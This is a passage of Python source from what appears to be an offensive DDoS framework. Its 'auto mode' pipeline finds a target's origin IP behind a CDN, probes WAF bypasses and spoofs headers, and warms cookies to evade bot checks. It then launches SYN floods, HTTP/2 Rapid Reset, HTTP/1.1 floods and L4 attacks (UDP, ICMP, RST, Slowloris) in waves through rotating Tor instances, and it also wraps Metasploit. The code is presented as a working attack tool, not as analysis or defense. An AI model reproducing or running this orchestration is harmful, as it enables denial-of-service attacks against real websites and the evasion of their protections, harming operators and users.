        print(f"  [V3]   WAF: {'YES' if profile.waf_detected else 'unknown'}")
        print(f"  [V3]   Origin: {'REACHABLE' if profile.origin_reachable else 'unknown'}")
        print()

        # Phase 0b: WAF Bypass Probing + Cookie Warmup
        waf_results = {"working_methods": [], "working_encodings": [], "waf_type": "unknown"}
        cookie_warmup_cookies: Dict[str, str] = {}
        waf_headers_pool_count = 0
        try:
            print(f"  {'='*50}")
            print(f"  [V3] Phase 0b: WAF Bypass Probing & Cookie Warmup")
            print(f"  {'='*50}")
            waf_prober = WafBypassProber(self.target)
            waf_results = await waf_prober.probe_all(timeout=5)
            cookie_warmup = CookieWarmupEngine(self.target)
            warmup_ok = await cookie_warmup.warmup(timeout=30)
            cookie_warmup_cookies = cookie_warmup.cookies
            waf_headers_pool = WafHeaderSpoofingPool()
            waf_headers_pool_count = len(waf_headers_pool.HEADER_POOLS)
            self.bypass_info["waf"] = waf_results
            self.bypass_info["cookies"] = bool(cookie_warmup.cookies)
            self.bypass_info["header_pool"] = waf_headers_pool_count
            print(f"  [V3]   WAF bypass: {len(waf_results.get('working_methods',[]))} methods ready")
            print(f"  [V3]   Cookies: {'WARMED' if warmup_ok else 'SKIPPED'}")
            print(f"  [V3]   Header pool: {waf_headers_pool_count} categories loaded")
        except Exception as e:
            print(f"  [V3]   Phase 0b skipped: {e}")
        print()

        # Phase 0c: Full bypass orchestrator recon if available
        bypass_recon = {}
        try:
            from core.bypass.orchestrator import AdvancedOrchestrator, AttackProfile
            bp = AttackProfile(target_url=self.target)
            orch = AdvancedOrchestrator(bp)
            bypass_recon = await orch.reconnaissance()
            self.bypass_info["orchestrator"] = {
                "origins": len(bypass_recon.get('techniques',{}).get('origin_discovery',{}).get('origin_servers',[])),
                "waf_methods": len(bypass_recon.get('techniques',{}).get('waf_bypass',{}).get('working_methods',[])),
            }
            print(f"  [V3]   Orchestrator recon: origin={self.bypass_info['orchestrator']['origins']} | WAF methods={self.bypass_info['orchestrator']['waf_methods']}")
        except Exception as e:
            print(f"  [V3]   Orchestrator bypass: {e}")
        print()

        # Phase 0d: Session Warming & Behavioral Pre-flight
        session_warming_cookies: Dict[str, str] = {}
        behavioral_warmup_obj = None
        try:
            print(f"  {'='*50}")
            print(f"  [V3] Phase 0d: Session Warming & Behavioral Pre-flight")
            print(f"  {'='*50}")
            session_warmup = SessionWarmingEngine(self.target)
            await session_warmup.warmup(duration=45)
            session_warming_cookies = dict(session_warmup.cookies)
            bw = await self._behavioral_warmup()
            behavioral_warmup_obj = bw
            if session_warming_cookies:
                session_warming_cookies.update(bw.cookies)
                print(f"  [V3]   Total session cookies: {len(session_warming_cookies)}")
        except Exception as e:
            print(f"  [V3]   Session warming skipped: {e}")
        print()

        # Start Tor
        if self.tor_available:
            print(f"  [V3] Starting Tor instances...")
            tor_ok = await self.start_tor()
            print(f"  [V3] Tor: {'READY' if tor_ok else 'SKIPPED'} ({self.proxy_chain})")
            print()
        else:
            tor_ok = False

        # Phase 1: Method Probing (with bypass headers)
        print(f"  {'='*50}")
        print(f"  [V3] Phase 1: Method Probing (Bayesian scoring + WAF bypass)")
        print(f"  {'='*50}")
        prober = MethodProber(
            target=self.target, origin_ip=self.origin_ip,
            server_type=profile.server_type, proxy_chain=self.proxy_chain,
            tor_available=tor_ok,
        )
        ranked = await prober.probe_all(duration=10)
        print()
        print(f"  [V3] === Method Rankings ===")
        for i, mr in enumerate(ranked):
            status = "WORKS" if mr.working else "FAIL"
            extra = " [WAF bypass]" if i < 3 and waf_results.get("working_methods") else ""
            print(f"  [V3]   #{i+1}: {mr.method:25s} score={mr.score:>8.1f} ok={mr.ok:>6,} fail={mr.fail:>6,} ({status}){extra}")
        print()

        # Phase 2: Parallel Attack (Baseline + Adaptive)
        print(f"  {'='*50}")
        print(f"  [V3] Phase 2: Parallel Attack (Baseline SYN+RR + Top Methods)")
        print(f"  {'='*50}")
        print(f"  [V3] Baseline: SYN flood + Rapid Reset (Tor rotation)")
        print(f"  [V3] Adaptive: Top {min(3, len(ranked))} methods from probing")
        print()

        # Launch CombinedEngine (V3 baseline)
        combined = CombinedEngine(
            target=self.target, origin_ip=self.origin_ip, duration=self.duration,
            syn_threads=self.syn_threads, rr_threads=self.rr_threads,
            tor_instances=0,  # Tor already started in SmartAutoModeV3
            rotation_interval=self.rotation_interval,
        )
        combined._proxy_chain = self.proxy_chain
        combined._start_ts = time.time()

        # Start SYN + RR baseline
        syn_task = asyncio.create_task(combined._launch_syn_flood())
        rr_task = asyncio.create_task(combined._launch_rapid_reset())

        # Monitor baseline proc output
        async def monitor_baseline():
            syn_proc_await = await syn_task
            rr_proc_await = await rr_task
            combined._syn_proc = syn_proc_await
            combined._rr_proc = rr_proc_await
            readers = [
                asyncio.create_task(combined._monitor_stream(syn_proc_await.stdout, "syn", combined.syn_stats)),
                asyncio.create_task(combined._monitor_stream(syn_proc_await.stderr, "syn", combined.syn_stats)),
                asyncio.create_task(combined._monitor_stream(rr_proc_await.stdout, "rr", combined.rr_stats)),
                asyncio.create_task(combined._monitor_stream(rr_proc_await.stderr, "rr", combined.rr_stats)),
            ]
            monitor_task = asyncio.create_task(combined._monitor_loop())
            return readers + [monitor_task]

        baseline_init = asyncio.create_task(monitor_baseline())

        # BURST mode wrapper (short-burst high intensity waves)
        burst = BurstMode(burst_duration=120, rest_duration=45, max_waves=5)

        async def _burst_adaptive_wrapper():
            for wave in range(1, burst.max_waves + 1):
                burst.wave = wave
                intensity = burst.get_intensity()
                print(f"  [V3] BURST Wave {wave}/{burst.max_waves} - intensity x{intensity:.1f}")
                wave_duration = min(120, self.duration // burst.max_waves)

                wave_adaptive = AdaptiveEngine(
                    target=self.target, origin_ip=self.origin_ip,
                    duration=wave_duration,
                    ranked_methods=ranked, proxy_chain=self.proxy_chain,
                    tor_available=tor_ok, max_methods=3,
                )
                await wave_adaptive.run()

                if wave < burst.max_waves:
                    rest = burst.rest_duration + random.uniform(0, 15)
                    print(f"  [V3] BURST Rest {rest:.0f}s before wave {wave+1}...")
                    await asyncio.sleep(rest)

        # Launch AdaptiveEngine for top methods
        adaptive = AdaptiveEngine(
            target=self.target, origin_ip=self.origin_ip, duration=self.duration,
            ranked_methods=ranked, proxy_chain=self.proxy_chain,
            tor_available=tor_ok, max_methods=3,
        )
        adaptive_task = asyncio.create_task(adaptive.run())
        burst_task = asyncio.create_task(_burst_adaptive_wrapper())

        # Wait for both to finish
        try:
            await asyncio.wait_for(asyncio.gather(baseline_init, adaptive_task, burst_task, return_exceptions=True),
                                   timeout=self.duration + 30)
        except asyncio.TimeoutError:
            pass
        except asyncio.CancelledError:
            print(f"\n  [!] Attack cancelled by user")

        # Stop baseline processes
        print(f"\n  [V3] Shutting down baseline...")
        if combined._syn_proc and combined._syn_proc.returncode is None:
            try: combined._syn_proc.kill()
            except: pass
        if combined._rr_proc and combined._rr_proc.returncode is None:
            try: combined._rr_proc.kill()
            except: pass
        if combined._rr_direct_proc and combined._rr_direct_proc.returncode is None:
            try: combined._rr_direct_proc.kill()
            except: pass

        # Stop adaptive methods
        print(f"  [V3] Shutting down adaptive methods...")
        for mname in list(adaptive.running.keys()):
            await adaptive.stop_method(mname)

        # Stop Tor
        await self.stop_tor()

        # Phase 3: Results
        combined_result = combined.syn_stats.get("stats", {})
        combined_rr = combined.rr_stats.get("stats", {})
        rr_direct_s = combined._rr_direct_stats.get("stats", {})
        adaptive_result = adaptive.get_results()

        print(f"\n  {_c('w','ATTACK RESULTS')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','SYN Flood:')}        {_c('g',format(syn_ok,','))+' ok'}  |  {_c('r',format(syn_fail,','))+' fail'}")
        print(f"  {_c('d','Rapid Reset:')}      {_c('g',format(rr_ok,','))+' ok'}  |  {_c('r',format(rr_fail,','))+' fail'}")
        print(f"  {_c('d','Adaptive L7:')}      {_c('g',format(adaptive_ok,','))+' ok'}  |  {_c('r',format(adaptive_fail,','))+' fail'}")
        print(f"  {_c('d','L4 Attacks:')}       {_c('y',format(l4_total,','))+' packets'}")
        print(f"  {_c('d','Python H2 Flood:')}  {_c('g',format(py_sent,','))+' requests'}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('w','GRAND TOTAL:')}      {_c('g',format(grand_total,','))+' requests'}")
        print()

        print(f"  {_c('w','TARGET INFO')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','Server:')}           {_c('w',profile_data.get('server_type', 'unknown'))}")
        print(f"  {_c('d','CDN:')}              {_c('y',origin_data.get('cdn', 'unknown'))}")
        print(f"  {_c('d','Origin IP:')}        {_c('g' if self.origin_ip else 'r',self.origin_ip or '(behind CDN)')}")
        print(f"  {_c('d','HTTP/2:')}           {_c('g' if profile_data.get('has_http2') else 'r','YES' if profile_data.get('has_http2') else 'NO')}")
        print(f"  {_c('d','WAF:')}              {_c('r' if profile_data.get('waf_detected') else 'g','DETECTED' if profile_data.get('waf_detected') else 'NO')}")
        print()

        if adaptive_result.get("methods"):
            print(f"  {_c('w','TOP METHODS')}")
            print(f"  {_c('c','-')*60}")
            for mname, mdata in list(adaptive_result.get("methods", {}).items())[:5]:
                ok = mdata.get("ok", 0)
                rps = mdata.get("rps", 0)
                print(f"  {_c('w',mname):20s}  {_c('g',format(ok,','))+' ok'}  |  {_c('c',str(round(rps,1)))+' rps'}")
            print()

        if l4_result:
            print(f"  {_c('w','L4 METHODS')}")
            print(f"  {_c('c','-')*60}")
            for mname, mdata in l4_result.items():
                if isinstance(mdata, dict):
                    sent = mdata.get("sent", mdata.get("active_connections", 0))
                    print(f"  {_c('w',mname):20s}  {_c('y',format(sent,','))+' packets'}")
            print()
        print(f"  [V3] Adaptive Method Breakdown:")
        for mname, mdata in adaptive_result.get("methods", {}).items():
            ok = mdata.get("ok", 0); fail = mdata.get("fail", 0); rps = mdata.get("rps", 0)
            probe = mdata.get("probe_only", False)
            label = " (probe only)" if probe else ""
            print(f"  [V3]   {mname:25s} | ok={ok:>8,} fail={fail:>8,} rps={rps:>8.1f}{label}")

        print(f"\n  [V3] Server: {profile.server_type}")
        print(f"  [V3] Top methods: {', '.join(adaptive_result.get('top_methods', []))}")
        if self.bypass_info.get("waf", {}).get("working_methods"):
            print(f"  [V3] WAF bypass: {len(self.bypass_info['waf']['working_methods'])} methods available")
        if cookie_warmup_cookies:
            print(f"  [V3] Cookies: {len(cookie_warmup_cookies)} warm cookies active")
        print()

        full_result = {
            "engine": "auto_mode_v3",
            "target": self.target, "origin_ip": self.origin_ip,
            "server_type": profile.server_type,
            "duration": self.duration,
            "syn_ok": syn_ok, "syn_fail": syn_fail,
            "rr_ok": rr_ok, "rr_fail": rr_fail,
            "adaptive_ok": adaptive_ok, "adaptive_fail": adaptive_fail,
            "grand_total": grand_total,
            "methods": adaptive_result.get("methods", {}),
            "top_methods": adaptive_result.get("top_methods", []),
            "tor_rotations": combined._total_tor_rotations + adaptive.total_tor_rotations,
            "has_http2": profile.has_http2, "waf_detected": profile.waf_detected,
            "bypass": {
                "waf_methods": len(self.bypass_info.get("waf", {}).get("working_methods", [])),
                "cookies_warmed": bool(cookie_warmup_cookies),
                "cf_detected": bool(waf_results.get("waf_type") == "cloudflare"),
                "header_pool_categories": waf_headers_pool_count,
                "encoding_tricks": len(waf_results.get("working_encodings", [])),
            },
        }

        # Save final report
        os.makedirs("logs", exist_ok=True)
        report_path = f"logs/auto_mode_v3_report_{datetime.now():%Y%m%d_%H%M%S}.json"
        try:
            with open(report_path, "w") as f:
                json.dump(full_result, f, indent=2)
            print(f"  [V3] Report saved: {report_path}")
        except Exception:
            pass

        return full_result


# ======================================================================
# SmartAutoModeV5 - Pipeline V5 (all modules integrated)
# ======================================================================

class SmartAutoModeV5(SmartAutoModeV3):
    """V5 pipeline: extends V3 with origin discovery V2, V5 vectors, L4 attacks, MSF, reports."""
    def __init__(self, target: str, origin_ip: str = "", duration: int = 600,
                 syn_threads: int = 500, rr_threads: int = 100,
                 tor_instances: int = 15, rotation_interval: int = 45,
                 securitytrails_key: str = ""):
        super().__init__(
            target=target, origin_ip=origin_ip, duration=duration,
            syn_threads=syn_threads, rr_threads=rr_threads,
            tor_instances=tor_instances, rotation_interval=rotation_interval,
        )
        self.reporter = ReportGenerator()
        self.report_id = ""
        self.l4_attacker = L4AttackManager()
        self.msf = MetasploitWrapper()
        self._st_key = securitytrails_key

    async def run(self) -> Dict[str, Any]:
        print(f"\n  {_c('c','-'*60)}")
        print(f"  {_c('m','[V5]')} {_c('w','AUTO MODE V5')} - {_c('c','FULL PIPELINE + 50+ VECTORS')}")
        print(f"  {_c('c','-'*60)}")
        print(f"  {_c('d','Target:')}    {_c('w',self.target)}")
        print(f"  {_c('d','Duration:')}  {_c('y',str(self.duration)+'s')}")
        print(f"  {_c('d','Tor:')}       {_c('c',str(self.tor_instances)+' instances')}")
        print(f"  {_c('c','-'*60)}\n")

        self.report_id = self.reporter.init_report(self.target, self.duration, engine="auto_mode_v5")

        # ========================
        # Phase 0: Profiling + Origin Discovery V2 + V5 Recon
        # ========================
        self.reporter.start_phase("phase_0")
        print(f"  {_c('m','[PHASE 0]')} {_c('w','Server Profiling + Origin Discovery V2')}")
        print(f"  {_c('c','-')*60}")

        profile_data = {"server_type": "generic", "has_http2": False, "waf_detected": False}
        origin_data = {"origin_ips": [], "cdn": ""}
        v5_probe_data = {}

        try:
            print(f"  {_c('c','[*]')} Profiling server...")
            server_profiler = ServerProfiler(self.target, self.origin_ip)
            sp = server_profiler.run()
            profile_data = {
                "server_type": sp.server_type, "server_header": sp.server_header or "",
                "has_http2": sp.has_http2, "has_http3": sp.has_http3,
                "has_cf": sp.has_cf, "waf_detected": sp.waf_detected,
                "origin_reachable": sp.origin_reachable,
            }
            print(f"      {_c('d','Server:')} {_c('w',sp.server_type)}")
            print(f"      {_c('d','HTTP/2:')} {_c('g' if sp.has_http2 else 'r','YES' if sp.has_http2 else 'NO')}")
            print(f"      {_c('d','WAF:')}    {_c('r' if sp.waf_detected else 'g','DETECTED' if sp.waf_detected else 'NO')}")

            print(f"  {_c('c','[*]')} Origin Discovery V2 (7 techniques)...", end='', flush=True)
            origin_finder = OriginDiscoveryV2(self.target, securitytrails_key=self._st_key)
            try:
                origin_data = await asyncio.wait_for(origin_finder.discover_all(timeout=20), timeout=25)
                print(f" {_c('g','done.')}", flush=True)
            except asyncio.TimeoutError:
                print(f" {_c('r','timeout!')}", flush=True)
                origin_data = {"origin_ips": [], "subdomains": [], "cdn": "unknown"}
            if origin_data.get("origin_ips"):
                self.origin_ip = origin_data["origin_ips"][0]
            ips_found = len(origin_data.get('origin_ips', []))
            subs_found = len(origin_data.get('subdomains', []))
            print(f"      {_c('d','Origin IPs:')} {_c('g' if ips_found else 'y',str(ips_found))}")
            print(f"      {_c('d','Subdomains:')} {_c('w',str(subs_found))}")
            print(f"      {_c('d','CDN:')} {_c('y',origin_data.get('cdn', 'unknown'))}")

            print(f"  {_c('c','[*]')} V5 Vector Probing (20+ methods)...")
            v5_probe_data = await asyncio.wait_for(probe_all_v5(self.target), timeout=30)
            working_v5 = [k for k, v in v5_probe_data.items()
                         if isinstance(v, dict) and v.get(list(v.keys())[0]) if v
                         and any(vv == True for vv in v.values() if isinstance(vv, bool))]
            print(f"      {_c('d','Vectors:')} {_c('w',str(len(v5_probe_data))+' tested, '+str(len(working_v5))+' working')}")
        except Exception as e:
            print(f"  {_c('y','[!]')} Phase 0 error: {str(e)[:50]}")
        print()

        # ========================
        # Phase 0b: WAF Bypass Probing + Cookie Warmup
        # ========================
        self.reporter.start_phase("phase_0b")
        print(f"  {_c('m','[PHASE 0b]')} {_c('w','WAF Bypass + Cookie Warmup + L4 Probe')}")
        print(f"  {_c('c','-')*60}")

        waf_results = {"working_methods": [], "working_encodings": [], "waf_type": "unknown"}
        cookie_warmup_cookies: Dict[str, str] = {}
        waf_headers_pool_count = 0
        l4_probe = {}

        try:
            print(f"  [*] WAF Bypass Probing...")
            waf_prober = WafBypassProber(self.target)
            waf_results = await waf_prober.probe_all(timeout=5)
            waf_methods = len(waf_results.get('working_methods',[]))
            print(f"      {_c('d','Working methods:')} {_c('g',str(waf_methods))}")

            print(f"  {_c('c','[*]')} Cookie Warmup...")
            cookie_warmup = CookieWarmupEngine(self.target)
            warmup_ok = await cookie_warmup.warmup(timeout=30)
            cookie_warmup_cookies = cookie_warmup.cookies
            print(f"      {_c('d','Cookies:')} {_c('g' if warmup_ok else 'y','WARMED' if warmup_ok else 'SKIPPED')}")

            waf_headers_pool = WafHeaderSpoofingPool()
            waf_headers_pool_count = len(waf_headers_pool.HEADER_POOLS)
            self.bypass_info["waf"] = waf_results
            self.bypass_info["cookies"] = bool(cookie_warmup.cookies)
            self.bypass_info["header_pool"] = waf_headers_pool_count
            print(f"      {_c('d','Header pool:')} {_c('w',str(waf_headers_pool_count)+' categories')}")

            print(f"  {_c('c','[*]')} L4 Method Probing...")
            l4_probe = await asyncio.wait_for(self.l4_attacker.probe_all(self.target), timeout=15)
            print(f"      {_c('d','L4 methods:')} {_c('g',str(len(l4_probe))+' available')}")
        except Exception as e:
            print(f"  {_c('y','[!]')} Phase 0b error: {str(e)[:50]}")
        print()

        # ========================
        # Phase 0c: Orchestrator bypass recon
        # ========================
        self.reporter.start_phase("phase_0c")
        print(f"  {_c('m','[PHASE 0c]')} {_c('w','Advanced Recon + Metasploit')}")
        print(f"  {_c('c','-')*60}")

        bypass_recon = {}
        msf_available = self.msf.available()

        try:
            print(f"  {_c('c','[*]')} Orchestrator reconnaissance...")
            from core.bypass.orchestrator import AdvancedOrchestrator, AttackProfile
            bp = AttackProfile(target_url=self.target)
            orch = AdvancedOrchestrator(bp)
            bypass_recon = await orch.reconnaissance()
            self.bypass_info["orchestrator"] = {
                "origins": len(bypass_recon.get('techniques',{}).get('origin_discovery',{}).get('origin_servers',[])),
                "waf_methods": len(bypass_recon.get('techniques',{}).get('waf_bypass',{}).get('working_methods',[])),
            }
            origins = self.bypass_info['orchestrator']['origins']
            waf_m = self.bypass_info['orchestrator']['waf_methods']
            print(f"      {_c('d','Origins found:')} {_c('g' if origins else 'y',str(origins))}")
            print(f"      {_c('d','WAF methods:')} {_c('w',str(waf_m))}")
        except Exception as e:
            print(f"  {_c('y','[!]')} Orchestrator error: {str(e)[:40]}")

        print(f"  {_c('c','[*]')} Metasploit: {_c('r' if not msf_available else 'g','AVAILABLE' if msf_available else 'NOT FOUND')}")
        print()

        # ========================
        # Phase 0d: Session Warming
        # ========================
        self.reporter.start_phase("phase_0d")
        print(f"  {_c('m','[PHASE 0d]')} {_c('w','Session Warming & Behavioral Pre-flight')}")
        print(f"  {_c('c','-')*60}")

        session_warming_cookies: Dict[str, str] = {}
        try:
            print(f"  {_c('c','[*]')} Warming session (45s)...")
            session_warmup = SessionWarmingEngine(self.target)
            await session_warmup.warmup(duration=45)
            session_warming_cookies = dict(session_warmup.cookies)
            print(f"      {_c('d','Session cookies:')} {_c('w',str(len(session_warming_cookies)))}")
        except Exception as e:
            print(f"  {_c('y','[!]')} Session warming error: {str(e)[:40]}")
        print()

        # Start Tor via existing manager (with progress animation)
        tor_ok = False
        if self.tor_available:
            print(f"  {_c('m','[PHASE 0e]')} {_c('w','Tor Bootstrap')} ({_c('c',str(self.tor_instances)+' instances')})")
            print(f"  {_c('c','-')*60}")
            try:
                tor_ok = await self.start_tor()
                if tor_ok:
                    print(f"  {_c('g','[OK]')} Tor ready: {_c('w',self.proxy_chain)}")
                else:
                    print(f"  {_c('y','[!]')} Tor failed, using direct connection")
            except Exception as e:
                print(f"  [!] Tor error: {str(e)[:40]}")
            print()

        # ========================
        # Phase 1: Method Probing
        # ========================
        self.reporter.start_phase("phase_1")
        print(f"  [PHASE 1] Method Probing (Bayesian + V5 Vectors + L4)")
        print(f"  {'-'*60}")

        ranked = []
        try:
            print(f"  [*] Bayesian method ranking (10s)...")
            prober = MethodProber(
                target=self.target, origin_ip=self.origin_ip,
                server_type=profile_data.get("server_type", "generic"),
                proxy_chain=self.proxy_chain, tor_available=tor_ok,
            )
            ranked = await prober.probe_all(duration=10)
            print(f"      {_c('d','Methods ranked:')} {_c('w',str(len(ranked)))}")
            for i, mr in enumerate(ranked[:3]):
                print(f"      {_c('c','#'+str(i+1))}: {_c('w',mr.method):20s} {_c('g','score='+str(round(mr.score,1)))}")
        except Exception as e:
            print(f"  {_c('y','[!]')} Probing error: {str(e)[:40]}")

        print(f"  {_c('c','[*]')} V5 vectors: {_c('w',str(len(v5_probe_data))+' tested')}")
        print(f"  {_c('c','[*]')} L4 methods: {_c('w',str(len(l4_probe))+' available')}")
        print()

        # ========================
        # Phase 2: Multi-Vector Attack
        # ========================
        self.reporter.start_phase("phase_2")
        print(f"  {_c('m','[PHASE 2]')} {_c('w','Multi-Vector Attack')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','Baseline:')} {_c('w','SYN Flood + Rapid Reset')}")
        print(f"  {_c('d','Adaptive:')} {_c('w','Top '+str(min(3, len(ranked)))+' methods + L7 + L4')}")
        print()

        # ============================================================
        # PHASE 2a: Python HTTP/2 + Multi-Vector Flood (always runs)
        # ============================================================
        print(f"  {_c('c','[*]')} Launching Python h2/multi-vector flood engines...")
        h2_tasks: list = []
        mv_tasks: list = []
        py_flood_stats = {"sent": 0, "completed": 0, "failed": 0, "current_rps": 0}

        try:
            # Check if h2 library is available
            try:
                import h2.connection as _h2c
                has_h2 = True
            except ImportError:
                has_h2 = False

            # Build effective target URL for origin bypass
            py_target = self.target
            py_host_header = urlparse(self.target).hostname or ""
            if self.origin_ip:
                parsed = urlparse(self.target)
                py_target = f"{parsed.scheme or 'https'}://{self.origin_ip}{parsed.path or '/'}"
                if parsed.query:
                    py_target += "?" + parsed.query

            # Start h2 flood workers (fire-and-forget in thread pool)
            if has_h2:
                import queue as _queue
                h2_stats_q: _queue.Queue = _queue.Queue(maxsize=1000)
                h2_stop = threading.Event()

                num_workers = min(8, max(3, self.tor_instances // 2))
                for wi in range(num_workers):
                    h2_result = {}
                    th = threading.Thread(
                        target=lambda pw=self.proxy_chain: _run_h2_worker_fallback(
                            target=py_target, duration=self.duration,
                            rps=50000, worker_id=1000 + wi,
                            stats_queue=h2_stats_q, stop_event=h2_stop,
                            host_header=py_host_header,
                            result_dict=h2_result, proxy_url=pw,
                        ),
                        daemon=True,
                    )
                    th.start()
                    h2_tasks.append((th, h2_stop, h2_result, h2_stats_q))
                print(f"      {_c('g','[+]')} {num_workers} H2 Exhaust workers launched")
            else:
                print(f"      {_c('y','[!]')} h2 library not installed - HTTP/1.1 only")

            # Also start multi-vector HTTP/1.1 workers for non-h2 targets
            try:
                from core.attack.engines.multi_vector_engine import run_multi_vector_engine
                for wi in range(2):
                    mv_stop = threading.Event()
                    mv_result = {}
                    mv_q: _queue.Queue = _queue.Queue(maxsize=100)
                    th = threading.Thread(
                        target=run_multi_vector_engine,
                        kwargs=dict(
                            target_url=py_target, duration_seconds=float(self.duration),
                            target_rps=8000, worker_id=2000 + wi,
                            stats_queue=mv_q, stop_event=mv_stop,
                            result_dict=mv_result,
                            vector_mode="flood",
                            host_header=py_host_header,
                        ),
                        daemon=True,
                    )
                    th.start()
                    mv_tasks.append((th, mv_stop, mv_result, mv_q))
                print(f"      {_c('g','[+]')} {len(mv_tasks)} HTTP/1.1 multi-vector workers")
            except Exception as e:
                print(f"      {_c('y','[!]')} multi-vector engine: {e}")
        except Exception as e:
            print(f"      {_c('y','[!]')} Python flood setup error: {e}")

        # ============================================================
        # PHASE 2b: Go engine baseline (SYN + RR) - skip if no binary
        # ============================================================
        go_available = os.path.exists(GO_ENGINE)
        if not go_available:
            print(f"  {_c('y','[!]')} Go engine not found at {GO_ENGINE}")
            print(f"  {_c('y','[!]')} SYN/RR/adaptive disabled - using Python engines only")
            combined = None
            syn_task = None
            rr_task = None
            baseline_init = None
            adaptive = None
            adaptive_task = None
            burst_task = None
            syn_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
            rr_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
        else:
            print(f"  {_c('c','[*]')} Launching baseline (SYN + RR)...")
            combined = CombinedEngine(
                target=self.target, origin_ip=self.origin_ip, duration=self.duration,
                syn_threads=self.syn_threads, rr_threads=self.rr_threads,
                tor_instances=0, rotation_interval=self.rotation_interval,
            )
            combined._proxy_chain = self.proxy_chain
            combined._start_ts = time.time()

            syn_task = asyncio.create_task(combined._launch_syn_flood())
            rr_task = asyncio.create_task(combined._launch_rapid_reset())

            async def monitor_baseline():
                syn_proc_await = await syn_task
                rr_proc_await = await rr_task
                combined._syn_proc = syn_proc_await
                combined._rr_proc = rr_proc_await
                readers = [
                    asyncio.create_task(combined._monitor_stream(syn_proc_await.stdout, "syn", combined.syn_stats)),
                    asyncio.create_task(combined._monitor_stream(syn_proc_await.stderr, "syn", combined.syn_stats)),
                    asyncio.create_task(combined._monitor_stream(rr_proc_await.stdout, "rr", combined.rr_stats)),
                    asyncio.create_task(combined._monitor_stream(rr_proc_await.stderr, "rr", combined.rr_stats)),
                ]
                monitor_task = asyncio.create_task(combined._monitor_loop())
                return readers + [monitor_task]

            baseline_init = asyncio.create_task(monitor_baseline())

            # Launch V5 adaptive engine
            print(f"  {_c('c','[*]')} Launching adaptive engine (top {_c('g',str(min(3, len(ranked))))} methods)...")
            adaptive = AdaptiveEngine(
                target=self.target, origin_ip=self.origin_ip, duration=self.duration,
                ranked_methods=ranked, proxy_chain=self.proxy_chain,
                tor_available=tor_ok, max_methods=5,
            )
            adaptive_task = asyncio.create_task(adaptive.run())

            # BURST mode wrapper
            burst = BurstMode(burst_duration=120, rest_duration=45, max_waves=5)

            async def _burst_v5_wrapper():
                for wave in range(1, burst.max_waves + 1):
                    burst.wave = wave
                    intensity = burst.get_intensity()
                    if wave < burst.max_waves:
                        rest = burst.rest_duration + random.uniform(0, 15)
                        await asyncio.sleep(rest)

            burst_task = asyncio.create_task(_burst_v5_wrapper())

        # Launch V5 L4 attacks in parallel (Python-based)
        print(f"  {_c('c','[*]')} Launching L4 attacks (SYN/UDP/ICMP/RST/Slowloris)...")
        l4_task = asyncio.create_task(
            self.l4_attacker.launch_all(self.target, duration=min(self.duration, 60))
        )

        print(f"  {_c('c','[*]')} Attack running for {_c('w',str(self.duration)+'s')}...")
        print()

        # Create dashboard vector stats (mutable dicts shared with dashboard)
        syn_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
        rr_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
        dash_vecs = [
            {"stats": syn_ds, "status": "running", "label": "SYN Flood", "type": "go"},
            {"stats": rr_ds, "status": "running", "label": "Rapid Reset", "type": "go"},
        ]
        adaptive_dash_map = {}

        # Start Rich live dashboard
        from core.monitor.live_dashboard import LiveAttackDashboard
        dash = LiveAttackDashboard(
            target=self.target,
            vectors=dash_vecs,
            duration=self.duration,
            origin_ip=self.origin_ip or "",
            profile_info={
                "http2": profile_data.get("has_http2", False),
                "cdn": origin_data.get("cdn", "unknown"),
                "waf": "yes" if profile_data.get("waf_detected") else "no",
                "server": profile_data.get("server_type", "unknown"),
            },
            screen=True,
        )
        dash.start()

        # Wait with live monitoring
        monitor_interval = 15
        attack_start = time.time()
        last_report = 0.0
        _prev_syn = 0
        _prev_rr = 0

        # Collect Python engine stats
        async def _py_stats_collector():
            """Collect stats from h2 + multi-vector workers."""
            while True:
                await asyncio.sleep(5)
                elapsed = time.time() - attack_start
                if elapsed >= self.duration:
                    break
                total_sent = 0
                total_ok = 0
                total_fail = 0
                for th, evt, res, q in h2_tasks:
                    while True:
                        try:
                            snap = q.get_nowait()
                            if isinstance(snap, dict):
                                total_sent = max(total_sent, int(snap.get("sent", 0)))
                                total_fail = max(total_fail, int(snap.get("failed", 0)))
                        except Exception:
                            break
                for th, evt, res, q in mv_tasks:
                    while True:
                        try:
                            snap = q.get_nowait()
                            if isinstance(snap, dict):
                                total_sent = max(total_sent, int(snap.get("sent", 0)))
                                total_fail = max(total_fail, int(snap.get("failed", 0)))
                        except Exception:
                            break
                py_flood_stats["sent"] = total_sent
                py_flood_stats["failed"] = total_fail
                py_flood_stats["current_rps"] = total_sent / max(1, elapsed)

        async def _monitor_attack():
            nonlocal last_report, _prev_syn, _prev_rr
            while True:
                await asyncio.sleep(monitor_interval)
                elapsed = time.time() - attack_start
                remaining = max(0, self.duration - elapsed)

                if combined is not None:
                    syn_ok = combined.syn_stats.get("stats", {}).get("completed", 0)
                    syn_fail = combined.syn_stats.get("stats", {}).get("failed", 0)
                    syn_tot = syn_ok + syn_fail
                    rr_s = combined._rr_direct_stats.get("stats", {})
                    rr_ok = rr_s.get("completed", combined.rr_stats.get("stats", {}).get("completed", 0))
                    rr_fail = rr_s.get("failed", combined.rr_stats.get("stats", {}).get("failed", 0))
                    rr_tot = rr_ok + rr_fail
                    syn_ds["total_requests"] = syn_tot
                    syn_ds["completed"] = syn_ok
                    syn_ds["failed"] = syn_fail
                    syn_ds["current_rps"] = (syn_tot - _prev_syn) / max(1, monitor_interval)
                    _prev_syn = syn_tot
                    rr_ds["total_requests"] = rr_tot
                    rr_ds["completed"] = rr_ok
                    rr_ds["failed"] = rr_fail
                    rr_ds["current_rps"] = (rr_tot - _prev_rr) / max(1, monitor_interval)
                    _prev_rr = rr_tot

                if adaptive is not None:
                    for mname, rm in list(adaptive.running.items()):
                        if mname not in adaptive_dash_map:
                            mstats = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
                            adaptive_dash_map[mname] = mstats
                            dash_vecs.append({
                                "stats": mstats,
                                "status": "running",
                                "label": mname.replace("_", " ").title(),
                                "type": "py",
                            })
                        ok = rm.stats.get("ok", 0)
